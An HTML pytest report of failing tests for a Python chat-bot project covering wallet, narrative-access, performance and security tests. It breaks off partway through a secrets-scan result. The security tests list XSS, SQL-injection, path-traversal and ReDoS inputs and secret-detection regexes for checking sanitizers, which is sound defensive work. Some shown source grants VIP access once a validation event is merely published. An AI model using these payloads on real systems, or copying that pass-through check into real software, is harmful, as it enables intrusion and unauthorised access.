            <div class="log">self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f5b80&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8cf3aa0&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537617074064&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_get_balance_user_not_found(self, besitos_wallet, mock_mongodb_handler):<br/>        &quot;&quot;&quot;Test getting balance for non-existent user.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;nonexistent_user&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>    <br/>        # Mock user document not found<br/>        mock_users_collection.find_one.return_value = None<br/>    <br/>        # Act<br/>&gt;       balance = await besitos_wallet.get_balance(user_id)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:315: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8cf3aa0&gt;<br/>user_id = &#x27;nonexistent_user&#x27;<br/><br/>    async def get_balance(self, user_id: str) -&gt; int:<br/>        &quot;&quot;&quot;Get user&#x27;s current besitos balance.<br/>    <br/>        Args:<br/>            user_id: User ID to get balance for<br/>    <br/>        Returns:<br/>            int: Current besitos balance<br/>        &quot;&quot;&quot;<br/>        logger.debug(&quot;Getting balance for user %s&quot;, user_id)<br/>    <br/>        try:<br/>&gt;           user_doc = await self.users_collection.find_one(<br/>                {&quot;user_id&quot;: user_id},<br/>                {&quot;besitos_balance&quot;: 1}<br/>            )<br/><span class="error">E           TypeError: object NoneType can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:334: TypeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_get_vip_fragment_with_user_id</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.narrative.fragment_manager.NarrativeFragmentManager object at 0x7d16f8caee10&gt;<br/>user_id = &#x27;test_user_123&#x27;, fragment_id = &#x27;vip_fragment_1&#x27;<br/><br/>    async def _validate_vip_access(self, user_id: str, fragment_id: str) -&gt; None:<br/>        &quot;&quot;&quot;Validate VIP access for a fragment through coordinator service integration.<br/>    <br/>        Implements requirement 1.4: IF a user has VIP status<br/>        THEN the system SHALL allow access to premium narrative levels.<br/>    <br/>        Args:<br/>            user_id (str): User identifier<br/>            fragment_id (str): Fragment identifier<br/>    <br/>        Raises:<br/>            VIPAccessRequiredError: If user doesn&#x27;t have VIP access<br/>        &quot;&quot;&quot;<br/>        logger.debug(&quot;Validating VIP access for user: %s, fragment: %s&quot;, user_id, fragment_id)<br/>    <br/>        try:<br/>            # Publish VIP access validation request event<br/>            # This integrates with the coordinator service pattern<br/>&gt;           validation_event = create_event(<br/>                &quot;vip_access_validation_requested&quot;,<br/>                user_id=user_id,<br/>                fragment_id=fragment_id,<br/>                request_timestamp=datetime.utcnow()<br/>            )<br/><br/>src/modules/narrative/fragment_manager.py:362: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>event_type = &#x27;vip_access_validation_requested&#x27;<br/>kwargs = {&#x27;fragment_id&#x27;: &#x27;vip_fragment_1&#x27;, &#x27;request_timestamp&#x27;: datetime.datetime(2025, 9, 20, 23, 17, 29, 681829), &#x27;user_id&#x27;: &#x27;test_user_123&#x27;}<br/><br/>    def create_event(event_type: str, **kwargs) -&gt; BaseEvent:<br/>        &quot;&quot;&quot;Factory function to create event instances.<br/>    <br/>        Args:<br/>            event_type (str): Type of event to create<br/>            **kwargs: Event-specific parameters<br/>    <br/>        Returns:<br/>            BaseEvent: Created event instance<br/>    <br/>        Raises:<br/>            ValueError: If event_type is not supported<br/>        &quot;&quot;&quot;<br/>        if event_type not in EVENT_MODELS:<br/>&gt;           raise ValueError(f&quot;Unsupported event type: {event_type}&quot;)<br/><span class="error">E           ValueError: Unsupported event type: vip_access_validation_requested</span><br/><br/>src/events/models.py:461: ValueError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;narrative.test_fragment_manager.TestNarrativeFragmentManager object at 0x7d17015247d0&gt;<br/>fragment_manager = &lt;src.modules.narrative.fragment_manager.NarrativeFragmentManager object at 0x7d16f8caee10&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537615171840&#x27;&gt;<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537616800000&#x27;&gt;<br/>sample_vip_fragment = {&#x27;choices&#x27;: [{&#x27;choice_id&#x27;: &#x27;choice_1&#x27;, &#x27;next_fragment_id&#x27;: &#x27;vip_fragment_2&#x27;, &#x27;text&#x27;: &#x27;First choice&#x27;}], &#x27;content&#x27;: &#x27;Thi... VIP narrative fragment.&#x27;, &#x27;fragment_id&#x27;: &#x27;vip_fragment_1&#x27;, &#x27;metadata&#x27;: {&#x27;is_checkpoint&#x27;: False, &#x27;tags&#x27;: [&#x27;vip&#x27;]}, ...}<br/><br/>    def test_get_vip_fragment_with_user_id(self, fragment_manager, mock_mongodb_handler, mock_event_bus, sample_vip_fragment):<br/>        &quot;&quot;&quot;Test successful retrieval of VIP fragment with user ID.&quot;&quot;&quot;<br/>        # Arrange<br/>        mock_collection = mock_mongodb_handler.get_narrative_fragments_collection.return_value<br/>        mock_collection.find_one.return_value = sample_vip_fragment<br/>        fragment_id = &quot;vip_fragment_1&quot;<br/>        user_id = &quot;test_user_123&quot;<br/>    <br/>        # Act<br/>&gt;       result = asyncio.run(fragment_manager.get_fragment(fragment_id, user_id))<br/><br/>tests/modules/narrative/test_fragment_manager.py:170: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/>/usr/lib/python3.12/asyncio/runners.py:194: in run<br/>    return runner.run(main)<br/>/usr/lib/python3.12/asyncio/runners.py:118: in run<br/>    return self._loop.run_until_complete(task)<br/>/usr/lib/python3.12/asyncio/base_events.py:687: in run_until_complete<br/>    return future.result()<br/>src/modules/narrative/fragment_manager.py:106: in get_fragment<br/>    await self._validate_vip_access(user_id, fragment_id)<br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.narrative.fragment_manager.NarrativeFragmentManager object at 0x7d16f8caee10&gt;<br/>user_id = &#x27;test_user_123&#x27;, fragment_id = &#x27;vip_fragment_1&#x27;<br/><br/>    async def _validate_vip_access(self, user_id: str, fragment_id: str) -&gt; None:<br/>        &quot;&quot;&quot;Validate VIP access for a fragment through coordinator service integration.<br/>    <br/>        Implements requirement 1.4: IF a user has VIP status<br/>        THEN the system SHALL allow access to premium narrative levels.<br/>    <br/>        Args:<br/>            user_id (str): User identifier<br/>            fragment_id (str): Fragment identifier<br/>    <br/>        Raises:<br/>            VIPAccessRequiredError: If user doesn&#x27;t have VIP access<br/>        &quot;&quot;&quot;<br/>        logger.debug(&quot;Validating VIP access for user: %s, fragment: %s&quot;, user_id, fragment_id)<br/>    <br/>        try:<br/>            # Publish VIP access validation request event<br/>            # This integrates with the coordinator service pattern<br/>            validation_event = create_event(<br/>                &quot;vip_access_validation_requested&quot;,<br/>                user_id=user_id,<br/>                fragment_id=fragment_id,<br/>                request_timestamp=datetime.utcnow()<br/>            )<br/>    <br/>            await self.event_bus.publish(&quot;vip_access_validation_requested&quot;, validation_event.dict())<br/>    <br/>            # In a real implementation, we would wait for a response event<br/>            # or call the coordinator service directly<br/>            # For now, we&#x27;ll assume the validation passes if the event was published<br/>    <br/>            logger.debug(&quot;VIP access validation requested for user: %s&quot;, user_id)<br/>    <br/>        except Exception as e:<br/>            logger.error(&quot;Error validating VIP access: %s&quot;, str(e))<br/>&gt;           raise VIPAccessRequiredError(f&quot;VIP access validation failed: {str(e)}&quot;)<br/><span class="error">E           src.modules.narrative.fragment_manager.VIPAccessRequiredError: VIP access validation failed: Unsupported event type: vip_access_validation_requested</span><br/><br/>src/modules/narrative/fragment_manager.py:379: VIPAccessRequiredError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.narrative.fragment_manager:fragment_manager.py:378 Error validating VIP access: Unsupported event type: vip_access_validation_requested<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_update_progress_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.narrative.fragment_manager.NarrativeFragmentManager object at 0x7d170141e900&gt;<br/>user_id = &#x27;test_user_123&#x27;, fragment_id = &#x27;test_fragment_1&#x27;<br/>current_progress = {&#x27;active&#x27;: True, &#x27;choices_made&#x27;: {&#x27;intro_1&#x27;: &#x27;choice_a&#x27;, &#x27;intro_2&#x27;: &#x27;choice_b&#x27;}, &#x27;completed_fragments&#x27;: [&#x27;intro_1&#x27;, &#x27;intro_2&#x27;], &#x27;completion_percentage&#x27;: 20.0, ...}<br/><br/>    async def _validate_progression_conditions(self, user_id: str, fragment_id: str, current_progress: Dict[str, Any]) -&gt; None:<br/>        &quot;&quot;&quot;Validate progression conditions via coordinator service.<br/>    <br/>        Implements requirement 1.5: WHEN a narrative checkpoint is reached<br/>        THEN the system SHALL validate progression conditions via the coordinator service.<br/>    <br/>        Args:<br/>            user_id (str): User identifier<br/>            fragment_id (str): Target fragment identifier<br/>            current_progress (Dict[str, Any]): Current user progress<br/>    <br/>        Raises:<br/>            ProgressionValidationError: If progression conditions are not met<br/>        &quot;&quot;&quot;<br/>        logger.debug(&quot;Validating progression conditions for user: %s to fragment: %s&quot;, user_id, fragment_id)<br/>    <br/>        try:<br/>            # Get the target fragment to check its unlock conditions<br/>            collection = self.mongodb_handler.get_narrative_fragments_collection()<br/>            fragment_data = collection.find_one({&quot;fragment_id&quot;: fragment_id})<br/>    <br/>            if not fragment_data:<br/>                raise ProgressionValidationError(f&quot;Target fragment not found: {fragment_id}&quot;)<br/>    <br/>            # Check unlock conditions from fragment metadata<br/>            unlock_conditions = fragment_data.get(&quot;metadata&quot;, {}).get(&quot;unlock_conditions&quot;, {})<br/>    <br/>            if unlock_conditions:<br/>                # Validate conditions (simple implementation)<br/>                required_fragments = unlock_conditions.get(&quot;required_fragments&quot;, [])<br/>                completed_fragments = current_progress.get(&quot;completed_fragments&quot;, [])<br/>    <br/>&gt;               for required_fragment in required_fragments:<br/><span class="error">E               TypeError: &#x27;Mock&#x27; object is not iterable</span><br/><br/>src/modules/narrative/fragment_manager.py:413: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;narrative.test_fragment_manager.TestNarrativeFragmentManager object at 0x7d17016f70e0&gt;<br/>fragment_manager = &lt;src.modules.narrative.fragment_manager.NarrativeFragmentManager object at 0x7d170141e900&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537616796880&#x27;&gt;<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537616797408&#x27;&gt;<br/>sample_user_progress = {&#x27;active&#x27;: True, &#x27;choices_made&#x27;: {&#x27;intro_1&#x27;: &#x27;choice_a&#x27;, &#x27;intro_2&#x27;: &#x27;choice_b&#x27;}, &#x27;completed_fragments&#x27;: [&#x27;intro_1&#x27;, &#x27;intro_2&#x27;], &#x27;completion_percentage&#x27;: 20.0, ...}<br/><br/>    def test_update_progress_success(self, fragment_manager, mock_mongodb_handler, mock_event_bus, sample_user_progress):<br/>        &quot;&quot;&quot;Test successful progress update.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;test_user_123&quot;<br/>        fragment_id = &quot;test_fragment_1&quot;<br/>        choice_id = &quot;choice_1&quot;<br/>    <br/>        # Mock get_user_progress to return sample data<br/>        with patch.object(fragment_manager, &#x27;get_user_progress&#x27;, AsyncMock(return_value=sample_user_progress)):<br/>            # Mock _update_progress_in_db to return success<br/>            with patch.object(fragment_manager, &#x27;_update_progress_in_db&#x27;, AsyncMock(return_value=True)):<br/>                # Mock _is_checkpoint to return False for simplicity<br/>                with patch.object(fragment_manager, &#x27;_is_checkpoint&#x27;, AsyncMock(return_value=False)):<br/>                    # Act<br/>&gt;                   result = asyncio.run(fragment_manager.update_progress(user_id, fragment_id, choice_id))<br/><br/>tests/modules/narrative/test_fragment_manager.py:193: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/>/usr/lib/python3.12/asyncio/runners.py:194: in run<br/>    return runner.run(main)<br/>/usr/lib/python3.12/asyncio/runners.py:118: in run<br/>    return self._loop.run_until_complete(task)<br/>/usr/lib/python3.12/asyncio/base_events.py:687: in run_until_complete<br/>    return future.result()<br/>src/modules/narrative/fragment_manager.py:214: in update_progress<br/>    await self._validate_progression_conditions(user_id, fragment_id, current_progress)<br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.narrative.fragment_manager.NarrativeFragmentManager object at 0x7d170141e900&gt;<br/>user_id = &#x27;test_user_123&#x27;, fragment_id = &#x27;test_fragment_1&#x27;<br/>current_progress = {&#x27;active&#x27;: True, &#x27;choices_made&#x27;: {&#x27;intro_1&#x27;: &#x27;choice_a&#x27;, &#x27;intro_2&#x27;: &#x27;choice_b&#x27;}, &#x27;completed_fragments&#x27;: [&#x27;intro_1&#x27;, &#x27;intro_2&#x27;], &#x27;completion_percentage&#x27;: 20.0, ...}<br/><br/>    async def _validate_progression_conditions(self, user_id: str, fragment_id: str, current_progress: Dict[str, Any]) -&gt; None:<br/>        &quot;&quot;&quot;Validate progression conditions via coordinator service.<br/>    <br/>        Implements requirement 1.5: WHEN a narrative checkpoint is reached<br/>        THEN the system SHALL validate progression conditions via the coordinator service.<br/>    <br/>        Args:<br/>            user_id (str): User identifier<br/>            fragment_id (str): Target fragment identifier<br/>            current_progress (Dict[str, Any]): Current user progress<br/>    <br/>        Raises:<br/>            ProgressionValidationError: If progression conditions are not met<br/>        &quot;&quot;&quot;<br/>        logger.debug(&quot;Validating progression conditions for user: %s to fragment: %s&quot;, user_id, fragment_id)<br/>    <br/>        try:<br/>            # Get the target fragment to check its unlock conditions<br/>            collection = self.mongodb_handler.get_narrative_fragments_collection()<br/>            fragment_data = collection.find_one({&quot;fragment_id&quot;: fragment_id})<br/>    <br/>            if not fragment_data:<br/>                raise ProgressionValidationError(f&quot;Target fragment not found: {fragment_id}&quot;)<br/>    <br/>            # Check unlock conditions from fragment metadata<br/>            unlock_conditions = fragment_data.get(&quot;metadata&quot;, {}).get(&quot;unlock_conditions&quot;, {})<br/>    <br/>            if unlock_conditions:<br/>                # Validate conditions (simple implementation)<br/>                required_fragments = unlock_conditions.get(&quot;required_fragments&quot;, [])<br/>                completed_fragments = current_progress.get(&quot;completed_fragments&quot;, [])<br/>    <br/>                for required_fragment in required_fragments:<br/>                    if required_fragment not in completed_fragments:<br/>                        raise ProgressionValidationError(<br/>                            f&quot;Required fragment not completed: {required_fragment}&quot;<br/>                        )<br/>    <br/>            # Publish progression validation event for coordinator service<br/>            validation_event = create_event(<br/>                &quot;progression_validation_requested&quot;,<br/>                user_id=user_id,<br/>                fragment_id=fragment_id,<br/>                current_progress=current_progress,<br/>                unlock_conditions=unlock_conditions<br/>            )<br/>    <br/>            await self.event_bus.publish(&quot;progression_validation_requested&quot;, validation_event.dict())<br/>    <br/>            logger.debug(&quot;Progression conditions validated for user: %s&quot;, user_id)<br/>    <br/>        except ProgressionValidationError:<br/>            raise<br/>        except Exception as e:<br/>            logger.error(&quot;Error validating progression conditions: %s&quot;, str(e))<br/>&gt;           raise ProgressionValidationError(f&quot;Progression validation failed: {str(e)}&quot;)<br/><span class="error">E           src.modules.narrative.fragment_manager.ProgressionValidationError: Progression validation failed: &#x27;Mock&#x27; object is not iterable</span><br/><br/>src/modules/narrative/fragment_manager.py:436: ProgressionValidationError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.narrative.fragment_manager:fragment_manager.py:435 Error validating progression conditions: &#x27;Mock&#x27; object is not iterable<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/performance/emotional/test_performance_benchmarks.py::test_behavioral_analysis_performance</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">@pytest.mark.asyncio<br/>    @pytest.mark.performance<br/>    async def test_behavioral_analysis_performance():<br/>        &quot;&quot;&quot;<br/>        Given: A behavioral analysis engine<br/>        When: A high volume of analyses are performed<br/>        Then: The average analysis time is within the 200ms threshold.<br/>        &quot;&quot;&quot;<br/>        # Arrange<br/>        # Setup a mock engine or use a real one with mocked dependencies<br/>        engine = Mock()<br/>&gt;       engine.analyze_interaction = asyncio.coroutine(lambda data: time.sleep(0.1))<br/><span class="error">E       AttributeError: module &#x27;asyncio&#x27; has no attribute &#x27;coroutine&#x27;. Did you mean: &#x27;coroutines&#x27;?</span><br/><br/>tests/performance/emotional/test_performance_benchmarks.py:20: AttributeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/performance/emotional/test_performance_benchmarks.py::test_memory_query_performance</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">@pytest.mark.asyncio<br/>    @pytest.mark.performance<br/>    async def test_memory_query_performance():<br/>        &quot;&quot;&quot;<br/>        Given: An emotional memory service<br/>        When: A high volume of memory queries are performed<br/>        Then: The average query time is within the 100ms threshold.<br/>        &quot;&quot;&quot;<br/>        # Arrange<br/>        memory_service = Mock()<br/>&gt;       memory_service.retrieve_relevant_memories = asyncio.coroutine(lambda user, context: time.sleep(0.05))<br/><span class="error">E       AttributeError: module &#x27;asyncio&#x27; has no attribute &#x27;coroutine&#x27;. Did you mean: &#x27;coroutines&#x27;?</span><br/><br/>tests/performance/emotional/test_performance_benchmarks.py:42: AttributeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_input_sanitization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_auth_security.TestAuthSecurity object at 0x7d170154cbc0&gt;<br/>webhook_handler = &lt;src.handlers.webhook.WebhookHandler object at 0x7d16d43015b0&gt;<br/><br/>    @pytest.mark.security<br/>    def test_input_sanitization(self, webhook_handler):<br/>        &quot;&quot;&quot;Test input sanitization for XSS prevention.&quot;&quot;&quot;<br/>        malicious_inputs = [<br/>            &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;,<br/>            &quot;javascript:alert(&#x27;xss&#x27;)&quot;,<br/>            &quot;&lt;img src=x onerror=alert(&#x27;xss&#x27;)&gt;&quot;,<br/>            &quot;&#x27;; DROP TABLE users; --&quot;,<br/>            &quot;../../../etc/passwd&quot;,<br/>        ]<br/>    <br/>        for malicious_input in malicious_inputs:<br/>            sanitized = webhook_handler.sanitize_input(malicious_input)<br/>            assert &quot;&lt;script&gt;&quot; not in sanitized<br/>            assert &quot;javascript:&quot; not in sanitized<br/>            assert &quot;onerror=&quot; not in sanitized<br/>&gt;           assert &quot;DROP TABLE&quot; not in sanitized<br/><span class="error">E           assert &#x27;DROP TABLE&#x27; not in &quot;&#x27;; DROP TABLE users; --&quot;</span><br/><span class="error">E             &#x27;DROP TABLE&#x27; is contained here:</span><br/><span class="error">E               &#x27;; DROP TABLE users; --</span><br/><br/>tests/security/test_auth_security.py:116: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_bot_token_format_validation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_auth_security.TestAuthSecurity object at 0x7d170154cd40&gt;<br/>config_manager = &lt;src.config.manager.ConfigManager object at 0x7d16d4c54980&gt;<br/><br/>    @pytest.mark.security<br/>    def test_bot_token_format_validation(self, config_manager):<br/>        &quot;&quot;&quot;Test bot token format validation.&quot;&quot;&quot;<br/>        invalid_tokens = [<br/>            &quot;&quot;,                    # Empty<br/>            &quot;short&quot;,              # Too short<br/>            &quot;123456789&quot;,          # Numbers only<br/>            &quot;abcdefghij&quot;,         # Letters only<br/>            &quot;123:abc&quot;,            # Wrong format<br/>            None,                 # None<br/>        ]<br/>    <br/>        for token in invalid_tokens:<br/>            with patch.dict(&#x27;os.environ&#x27;, {&#x27;BOT_TOKEN&#x27;: str(token) if token else &#x27;&#x27;}):<br/>&gt;               assert not config_manager.validate_bot_token()<br/><br/>tests/security/test_auth_security.py:133: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.config.manager.ConfigManager object at 0x7d16d4c54980&gt;<br/><br/>    def validate_bot_token(self) -&gt; bool:<br/>        &quot;&quot;&quot;Validate bot token format.&quot;&quot;&quot;<br/>        try:<br/>            token = self.get_bot_token()<br/>&gt;           return InputValidator.validate_bot_token(token)<br/><span class="error">E           NameError: name &#x27;InputValidator&#x27; is not defined</span><br/><br/>src/config/manager.py:143: NameError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_regex_dos_prevention</td>
          <td class="col-duration">1.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_data_security.TestDataSecurity object at 0x7d170154e690&gt;<br/><br/>    @pytest.mark.security<br/>    def test_regex_dos_prevention(self):<br/>        &quot;&quot;&quot;Test prevention of regex DoS attacks.&quot;&quot;&quot;<br/>        from src.utils.validators import safe_regex_match<br/>    <br/>        # Malicious regex patterns that could cause ReDoS<br/>        evil_patterns = [<br/>            r&quot;^(a+)+$&quot;,<br/>            r&quot;(a|a)*&quot;,<br/>            r&quot;(a|b)*a(a|b){20}&quot;,<br/>        ]<br/>    <br/>        # Input that would cause catastrophic backtracking<br/>        evil_input = &quot;a&quot; * 30 + &quot;b&quot;<br/>    <br/>        for pattern in evil_patterns:<br/>            # Test that regex matching has timeout/protection<br/>            result = safe_regex_match(pattern, evil_input, timeout_seconds=1)<br/>    <br/>            # Should timeout or return False for evil patterns<br/>&gt;           assert result is False or result is None<br/><span class="error">E           assert (True is False or True is None)</span><br/><br/>tests/security/test_data_security.py:188: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_api_response_information_disclosure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_data_security.TestDataSecurity object at 0x7d170154e930&gt;<br/><br/>    @pytest.mark.security<br/>    def test_api_response_information_disclosure(self):<br/>        &quot;&quot;&quot;Test that API responses don&#x27;t disclose sensitive information.&quot;&quot;&quot;<br/>        from src.core.error_handler import ErrorHandler<br/>    <br/>        error_handler = ErrorHandler()<br/>    <br/>        # Simulate various types of errors<br/>        errors = [<br/>            FileNotFoundError(&quot;/home/user/.env&quot;),<br/>            ConnectionError(&quot;Failed to connect to database at localhost:5432&quot;),<br/>            ValueError(&quot;Invalid token: sk-123456789abcdef&quot;),<br/>        ]<br/>    <br/>        for error in errors:<br/>            user_message = error_handler.handle_error(error, {})<br/>    <br/>            # User message should not contain sensitive paths, tokens, or internal details<br/>&gt;           assert &quot;/home/user/.env&quot; not in user_message<br/><span class="error">E           TypeError: argument of type &#x27;coroutine&#x27; is not iterable</span><br/><br/>tests/security/test_data_security.py:231: TypeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_webhook_payload_validation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_data_security.TestDataSecurity object at 0x7d170154ea80&gt;<br/><br/>    @pytest.mark.security<br/>    def test_webhook_payload_validation(self):<br/>        &quot;&quot;&quot;Test webhook payload validation and sanitization.&quot;&quot;&quot;<br/>        from src.handlers.webhook import WebhookHandler<br/>    <br/>        webhook_handler = WebhookHandler()<br/>    <br/>        # Test malicious payloads<br/>        malicious_payloads = [<br/>            &#x27;{&quot;message&quot;: {&quot;text&quot;: &quot;&lt;script&gt;alert(\&#x27;xss\&#x27;)&lt;/script&gt;&quot;}}&#x27;,<br/>            &#x27;{&quot;callback_query&quot;: {&quot;data&quot;: &quot;../../etc/passwd&quot;}}&#x27;,<br/>            &#x27;{&quot;message&quot;: {&quot;text&quot;: &quot;javascript:alert(\&#x27;xss\&#x27;)&quot;}}&#x27;,<br/>        ]<br/>    <br/>        for payload in malicious_payloads:<br/>            result = webhook_handler.validate_and_sanitize_payload(payload)<br/>    <br/>            # Should sanitize malicious content<br/>            assert &quot;&lt;script&gt;&quot; not in result<br/>            assert &quot;javascript:&quot; not in result<br/>&gt;           assert &quot;../&quot; not in result<br/><span class="error">E           assert &#x27;../&#x27; not in &#x27;{&quot;callback_...tc/passwd&quot;}}&#x27;</span><br/><span class="error">E             &#x27;../&#x27; is contained here:</span><br/><span class="error">E               {&quot;callback_query&quot;: {&quot;data&quot;: &quot;../../etc/passwd&quot;}}</span><br/><span class="error">E             ?                              +++</span><br/><br/>tests/security/test_data_security.py:256: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_secrets_detection</td>
          <td class="col-duration">9.11</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_vulnerability_scanning.TestVulnerabilityScanning object at 0x7d170154fbf0&gt;<br/><br/>    @pytest.mark.security<br/>    def test_secrets_detection(self):<br/>        &quot;&quot;&quot;Test for accidentally committed secrets.&quot;&quot;&quot;<br/>        project_root = Path(__file__).parent.parent.parent<br/>    <br/>        # Patterns that might indicate secrets<br/>        secret_patterns = [<br/>            r&#x27;(?i)(password|passwd|pwd)\s*=\s*[&quot;\&#x27;][^&quot;\&#x27;]+[&quot;\&#x27;]&#x27;,<br/>            r&#x27;(?i)(secret|key|token)\s*=\s*[&quot;\&#x27;][^&quot;\&#x27;]+[&quot;\&#x27;]&#x27;,<br/>            r&#x27;(?i)api[_-]?key\s*=\s*[&quot;\&#x27;][^&quot;\&#x27;]+[&quot;\&#x27;]&#x27;,<br/>            r&#x27;-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----&#x27;,<br/>            r&#x27;(?i)bearer\s+[a-zA-Z0-9_\-\.]+&#x27;,<br/>        ]<br/>    <br/>        import re<br/>        found_secrets = []<br/>    <br/>        # Scan source files<br/>        for file_path in project_root.rglob(&#x27;*.py&#x27;):<br/>            if &#x27;test&#x27; in str(file_path):<br/>                continue  # Skip test files<br/>    <br/>            try:<br/>                content = file_path.read_text(encoding=&#x27;utf-8&#x27;)<br/>                for pattern in secret_patterns:<br/>                    matches = re.findall(pattern, content)<br/>                    if matches:<br/>                        # Check if it&#x27;s a test/dummy value<br/>                        for match in matches:<br/>                            if not any(dummy in str(match).lower() for dummy in [&#x27;test&#x27;, &#x27;dummy&#x27;, &#x27;fake&#x27;, &#x27;example&#x27;]):<br/>                                found_secrets.append((str(file_path), pattern, match))<br/>            except (UnicodeDecodeError, FileNotFoundError):<br/>                continue<br/>    <br/>&gt;       assert len(found_secrets) == 0, f&quot;Found potential secrets: {found_secrets}&quot;<br/><span class="error">E       AssertionError: Found potential secrets: [(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pycodestyle.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pycodestyle.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), 